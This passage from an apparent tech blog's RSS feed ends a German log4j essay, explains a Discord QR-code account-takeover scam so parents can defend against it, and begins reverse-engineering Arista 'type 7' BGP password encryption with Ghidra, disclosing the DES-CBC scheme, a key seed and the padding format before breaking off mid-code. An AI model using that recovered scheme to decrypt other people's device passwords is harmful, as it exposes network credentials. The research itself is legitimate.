Aber andererseits hat es die Person, die das vor 8 Jahren implementiert hat, nicht gesehen, und auch die Hunderttausend, die log4j in ihre Codebasis importiert haben, sind nicht darüber gestolpert.
Was sagt uns das über den Dependency-Management-Prozess von Organisationen, die Software entwickeln?
Über das Verständnis der Codebase, der Abhängigkeiten, und der Prozesse, die Datenfluss und Releases planen?
Ja, genau.&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Wir verwenden eine modulare Architektur und agile Methoden, um die Entwicklungsgeschwindigkeit zu steigern.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E = 1/2m*(v^2)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mehr Entwicklungsgeschwindigkeit macht größere Krater.&lt;/p&gt;
&lt;h2 id=&#34;code-ist-nicht-dein-freund&#34;&gt;
    &lt;a href=&#34;#code-ist-nicht-dein-freund&#34;&gt;
	Code. Ist. Nicht. Dein. Freund.
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Ganz besonders nicht dynamisch aus dem Internet nachgeladener Code.&lt;/p&gt;
&lt;p&gt;Code. Ist. Nicht. Dein. Freund.&lt;/p&gt;
&lt;p&gt;Ich weiß, es klingt komisch, wenn man Entwickler ist und den eigenen Lebensunterhalt damit bestreitet, dass man glaubt, man sei mit dem Code befreundet.&lt;/p&gt;
&lt;p&gt;Aber so ist es.
Weniger Code ist besserer Code.
Am besten so wenig Code, dass man ihn zur Gänze und mit allen seinen Interaktionen verstehen kann.
Und auch den Code, der notwendig ist, um den eigenen Code zu betreiben.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Discord Nitro Spam and 2FA</title>
      <link>https://blog.koehntopp.info/2021/11/30/discord-nitro-spam-and-2fa.html</link>
      <pubDate>Tue, 30 Nov 2021 08:29:00 +0100</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/11/30/discord-nitro-spam-and-2fa.html</guid>
      <description>&lt;p&gt;This morning the Discord account of my son started to send &amp;ldquo;free nitro&amp;rdquo; spam to his friends on the friend list, and to some Discords he was a member of.
He had 2FA (Google Authenticator) on the account.
That fact alone made this a recoverable failure.&lt;/p&gt;
&lt;p&gt;My son is playing minecraft, has a friend list of around 100 fellow players, and is member of around 40 Discords.
He also connected his Discord to Spotify, YouTube and other services, and he authorized around 12 application services, mostly Discord/Minecraft bot services.
It is pretty safe to say that his Discord account is very valuable to him, and plays a central part in his pandemic coping.&lt;/p&gt;
&lt;p&gt;The spam was sending messages to all his friends, and a few Discords, impersonating him.
It was not acting as a bot, or even one of his own bots.
That means the spammer had accessed his account and identity.&lt;/p&gt;
&lt;h2 id=&#34;recovery-was-easy-thanks-to-2fa&#34;&gt;
    &lt;a href=&#34;#recovery-was-easy-thanks-to-2fa&#34;&gt;
	Recovery was easy, thanks to 2FA
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Changing the account password is a 2FA protected operation, and invalidates all other login tokens.&lt;/p&gt;
&lt;p&gt;That means, only a person having access to his cellphone can 2FA and change the password - him (or, this time, me).
It also means his Desktop client, all spammers impersonating him and everyone else is logged out.
This stopped the Spam dead immediately.&lt;/p&gt;
&lt;h2 id=&#34;how-the-spam-works&#34;&gt;
    &lt;a href=&#34;#how-the-spam-works&#34;&gt;
	How the spam works
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The &amp;ldquo;free nitro&amp;rdquo; spam is a message promising Discord Nitro (Server Boost, a pay feature) for free.
It contains a link that leads you to a typosquatter domain displaying Discords original CI.
It presents you with a QR code to scan.&lt;/p&gt;
&lt;p&gt;It then directs you to open the Discord app on the phone, hit the settings, hit the personal icon on the right and use the function labelled &amp;ldquo;Scan QR code&amp;rdquo; to claim the prize.&lt;/p&gt;
&lt;p&gt;Nothing in the UI of the original Discord cellphone app explains to a casual observer what this function does:
&amp;ldquo;Using this function will log somebody in to your account&amp;rdquo;.
The copy is simply &amp;ldquo;Scan QR code&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/discord-scan-qr.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Discord Settings show the &amp;ldquo;Use the cellphone to auth the desktop app&amp;rdquo; function simply as &amp;ldquo;Scan QR Code&amp;rdquo;. Nothing explains what the function really does: It logs in somebody which may or may not be you. Never use this function.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Doing what is being asked will provide a bot with a login token to your account.
The bot will then begin to send spam in your name to your friends and all discords you are member of.&lt;/p&gt;
&lt;p&gt;It will also change your password, if it can.
It cannot do that when 2FA is active on your account.
2FA is literally saving your account here.&lt;/p&gt;
&lt;h2 id=&#34;training-your-kid&#34;&gt;
    &lt;a href=&#34;#training-your-kid&#34;&gt;
	Training your kid
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Here is what to do: Train your kid to&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;use 2FA properly, and always use this and no login shortcuts.&lt;/li&gt;
&lt;li&gt;archive the original 2FA QR codes used for setting up 2FA. Make a screenshot, and store the PNG of the setup QR code on a USB stick or another offline storage for recovery. This is much easier than the regular account recovery procedures 2FA setups offer, and unlike them, it is one way that works the same for all accounts. It also lets you have the 2FA code generator on the phone and a tablet, for example.&lt;/li&gt;
&lt;li&gt;Never re-use passwords. In the case of my son, he did not use his Discord password anywhere else, and he has a password list. Thus, he had to change only the Discord password and not fix any other accounts.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also, help your kid: Audit their online accounts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;make yourself a calendar entry to audit the accounts your kid has every 6 months:
&lt;ul&gt;
&lt;li&gt;Check the password store: Make sure passwords are not re-used.&lt;/li&gt;
&lt;li&gt;Check 2FA: Have it enabled everywhere possible where regular TOTP can be used. Avoid Steam Authenticator or other special 2FA apps that may be offered, they are just more to learn and confusing. They break important workflows that must always be done right.&lt;/li&gt;
&lt;li&gt;Check account connections, cross-authentication, enabled bots and their permissions and so on.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;actually perform the audit.
&lt;ul&gt;
&lt;li&gt;Have your kid sit in on this, and explain what you do and why. Discuss your thought with them, and the risk analysis you do. Explain online business models with them, too: How is this service or game making money, where is the value, do you think that is okay? What do you want? Offer opinions and evaluation, but try to let them make choices.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also, hold yourself to the same standards.&lt;/p&gt;
&lt;p&gt;For the record, my personal Google Authenticator has 18 entries.
I did not specifically set out to maximize that, so just take this as a guidance, not a competition.&lt;/p&gt;
&lt;h2 id=&#34;2fa-works&#34;&gt;
    &lt;a href=&#34;#2fa-works&#34;&gt;
	2FA works!
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Again, note how 2FA worked exactly the way it is designed to work:&lt;/p&gt;
&lt;p&gt;It made a loss of control on the account a recoverable operation.
Instead of a permanent and total loss of the center of his online life, this was just an awkward 30 minutes and a bunch of apologies.&lt;/p&gt;
&lt;p&gt;Also note that while Discord is the better Slack, it does have UI/UX design problems around QR code quick authentication.
Never use this function.
Train your kid to not use this function.
Always login with username, password and 2FA.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Arista Type 7 Passwords</title>
      <link>https://blog.koehntopp.info/2021/11/22/arista-type-7-passwords.html</link>
      <pubDate>Sun, 21 Nov 2021 17:29:00 +0100</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/11/22/arista-type-7-passwords.html</guid>
      <description>&lt;p&gt;A friend of mine wanted to provision BGP passwords for their Arista switch configuration.&lt;/p&gt;
&lt;p&gt;So a config stanza such as&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;router bgp 65001
   router-id 10.1.1.1
   neighbor mydevices peer-group
   neighbor mydevices password 7 8kjYaye5DsQh0epELyKNe0oZ3E3zp39X
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;requires generation of the Password (actually &amp;ldquo;supersecretpassword&amp;rdquo;) in an encrypted form.&lt;/p&gt;
&lt;p&gt;Arista switches can do this using CLI tools, apparently.
They seem to have an onboard Linux, which seems to provide limited tooling, but is good enough to run a 32-bit Python 3.7.
Arista provides modules to help with handling their configuration.
&lt;a href=&#34;https://medium.com/@what_if/encrypting-decrypting-arista-bgp-bmp-ospf-passwords-ff2072460942&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Ryan Gelobter&lt;/a&gt;


documented these in an article on Medium.&lt;/p&gt;
&lt;p&gt;Unfortunately, these modules are not well portable.
They have been implemented in a CPython module for Python 3.7 on i386 (32bit) Linux.
They also have a lot of dependencies to other shared objects that are not easily available except in the switch environment.&lt;/p&gt;
&lt;p&gt;So, if you wanted to provision switch configurations,
you would need to run some code on the switch to generate the passwords the way Ryan Gelobter documents,
or do the same in a virtual machine with a virtual switch running in it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;switch1# bash python -c &amp;#39;import DesCrypt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;print DesCrypt.encrypt(&amp;#34;BMP1_passwd&amp;#34;, &amp;#34;supersecretpassword&amp;#34;)&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;JieKbldfLyl9IzUBJZRvKIcc1w5wWogI
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the &lt;code&gt;DesCrypt.py&lt;/code&gt; is not particularly helpful:
The code in it does little more than&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;_DesCrypt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;encryptedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_DesCrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbcEncrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and &lt;code&gt;_DesCrypt&lt;/code&gt; is actually &lt;code&gt;_Descrypt.cpython-37m-i386-linux-gnu.so&lt;/code&gt;.
Well, at least it is only 10 KB in size, so how hard can it be?&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s have a look:&lt;/p&gt;
&lt;h1 id=&#34;ghidra&#34;&gt;
    &lt;a href=&#34;#ghidra&#34;&gt;
	Ghidra
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;When we drop the module into Ghidra, we get to see a &lt;code&gt;PyInit__DesCrypt(void)&lt;/code&gt; symbol.
The code in that function just calls out to &lt;code&gt;PyModuleCreate2(&amp;amp;PyModuleDef, 0x3f5)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Looking at the &lt;code&gt;PyModuleDef&lt;/code&gt; requires &lt;a href=&#34;https://docs.python.org/3/c-api/module.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;the documentation&lt;/a&gt;

 to properly understand what is going on.
We identify two functions, &lt;code&gt;cbcEncrypt&lt;/code&gt; and &lt;code&gt;cbcDecrypt&lt;/code&gt; by their &lt;a href=&#34;https://docs.python.org/3/c-api/structures.html#c.PyMethodDef&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;code&gt;PyMethodDef&lt;/code&gt;&lt;/a&gt;

 entries.
Two labels for entry points in a stripped binary identified.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/arista-pymethoddef.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The Python Method Definition Table for the _DesCrypt Module defines two functions, named &lt;code&gt;cbcEncrypt&lt;/code&gt; and &lt;code&gt;cbcDecrypt&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Looking at the &lt;code&gt;cbcEncrypt&lt;/code&gt; function shows us that it has a dependency on &lt;code&gt;cbc_crypt()&lt;/code&gt;,
and that seems to be a function from &lt;code&gt;libc&lt;/code&gt;, according to &lt;a href=&#34;https://linux.die.net/man/3/cbc_crypt&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;the manpage&lt;/a&gt;

.
So it is ancient DES, in CBC mode that is being used.
We should be able to do this in pure Python without many additional dependencies then.&lt;/p&gt;
&lt;p&gt;Using Ghidra more, we can decode &lt;code&gt;cbcEncrypt()&lt;/code&gt; and the &lt;code&gt;getHashedKey()&lt;/code&gt; function it calls.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getHashedKey&lt;/code&gt; generates the key the usual way, by xor-ing the incoming string with itself in an 8 bytes long ring buffer, but the starting value is not all zeroes, but some magic value (&lt;code&gt;238ad5f51ec9a8d5&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;Also, &lt;code&gt;cbcEncrypt&lt;/code&gt; pads the data to an even 8 byte boundary as required by DES.
How much was padded needs to be embedded in the ciphertext.
There is a selection of standard methods for this, as offered for example by
&lt;a href=&#34;https://pycryptodome.readthedocs.io/en/latest/src/util/util.html#Crypto.Util.Padding.pad&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Crypto.Util.Padding.pad()&lt;/a&gt;


in pycryptodome (&amp;ldquo;pkcs7&amp;rdquo;, &amp;ldquo;iso7816&amp;rdquo; and &amp;ldquo;x923&amp;rdquo;).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cbcEncrypt&lt;/code&gt; uses none of these standard methods, and implements its own method:
the padding is encoded in the high nibble of a fixed magic int.&lt;/p&gt;
&lt;p&gt;That magic int is always prepended, even if no padding was necessary:
We get &lt;code&gt;?ebb884c&lt;/code&gt;, with &lt;code&gt;?&lt;/code&gt; indicating the number of padbytes (&lt;code&gt;0&lt;/code&gt; to &lt;code&gt;7&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/arista-gethashedkey.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Ghidra Output of the getHashedKey() function, with a bit of annotation and typing added to get a better view.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;With this information, we should be able to recreate the function in our own C-code and check if it can recreate the examples Ryan Gelobter provided.&lt;/p&gt;
&lt;p&gt;Of course, it does not.&lt;/p&gt;
&lt;h1 id=&#34;debugging-the-original-code&#34;&gt;
    &lt;a href=&#34;#debugging-the-original-code&#34;&gt;
	Debugging the original code
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;We need to debug, and in order to be able to do that we need to be able to load and isolate &lt;code&gt;getHashedKey()&lt;/code&gt; first.
The original version, to check what the actual hashed key should look like, and compare the result to our own.&lt;/p&gt;
&lt;p&gt;That should be easy:
An example &lt;a href=&#34;https://blog.koehntopp.info/2005/10/08/dynamisch-geladener-code.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;from 2005&lt;/a&gt;

 (german language article) shows&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;how to turn a function into a &lt;code&gt;libsomething.a&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;then into &lt;code&gt;libsomething.so&lt;/code&gt;, and&lt;/li&gt;
&lt;li&gt;then how to &lt;code&gt;dlopen()&lt;/code&gt; and &lt;code&gt;dlsym()&lt;/code&gt; that binary to call a single function in it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That final piece of code will serve us well:
We want to load the _DesCrypt module and call &lt;code&gt;getHashedKey()&lt;/code&gt; in an isolated context to see what a correct return value looks like.&lt;/p&gt;
&lt;h1 id=&#34;dependencies&#34;&gt;
    &lt;a href=&#34;#dependencies&#34;&gt;
	Dependencies
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Turns out, loading &lt;code&gt;_DesCrypt...so&lt;/code&gt; is not so easy, because of a dependency on &lt;code&gt;libtac.so.0&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ldd _DesCrypt.cpython-37m-i386-linux-gnu.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        linux-gate.so.1 (0xf7f7c000)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libtac.so.0 =&amp;gt; not found
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libpython3.7m.so.1.0 =&amp;gt; not found
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libstdc++.so.6 =&amp;gt; /lib32/libstdc++.so.6 (0xf7d81000)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libm.so.6 =&amp;gt; /lib32/libm.so.6 (0xf7c7d000)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libgcc_s.so.1 =&amp;gt; /lib32/libgcc_s.so.1 (0xf7c5e000)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7a73000)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        /lib/ld-linux.so.2 (0xf7f7e000)```
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So we are missing two libraries:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;libpython3.7m.so.1.0&lt;/code&gt; and&lt;/li&gt;
&lt;li&gt;&lt;code&gt;libtac.so.0&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The Python bit is fixed by building a Python-3.7 in 32-bit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; apt install gcc-multilib
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; wget https://www.python.org/ftp/python/3.7.5/Python-3.7.5.tgz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; tar xzf Python-3.7.5.tgz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Python-3.7.5/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./configure --build&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;i686-pc-linux-gnu &lt;span class=&#34;nv&#34;&gt;CFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-m32 &lt;span class=&#34;nv&#34;&gt;CXXFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-m32 &lt;span class=&#34;nv&#34;&gt;LDFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-m32 --enable-shared
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; make -j6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A minor roadbump: We need to build for 32-bit, but on a 64-bit machine.
The compile-flag &lt;code&gt;-m32&lt;/code&gt; does that, but it will fail due to some missing includes until we install &lt;code&gt;gcc-multilib&lt;/code&gt; as shown above.
We can then download the old version of Python, and build it with the required flags for 32-bit support.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;libtac.so.0&lt;/code&gt; we could copy off the switch.
If we try, things escalate quickly .
That is, because that &lt;code&gt;.so&lt;/code&gt; in turn loads even more libraries, most of which we don&amp;rsquo;t have access to.
And if we had them, they might load even more dependencies.&lt;/p&gt;
&lt;p&gt;Looking into Ghidra again, we know that the code we are interested in does not really depend on &lt;code&gt;libtac,so.0&lt;/code&gt;.
&lt;code&gt;cbcEncrypt()&lt;/code&gt; itself does, but only if something goes wrong and an exception is being raised,
but at this stage of our investigation we only want &lt;code&gt;getHashedKey()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Following the guide from 16 years ago, we can quickly write some code to &lt;code&gt;dlopen()&lt;/code&gt; the library:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func_t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;mydevices_passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;keylen&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;supersecretpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;func_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error_msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;main start&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
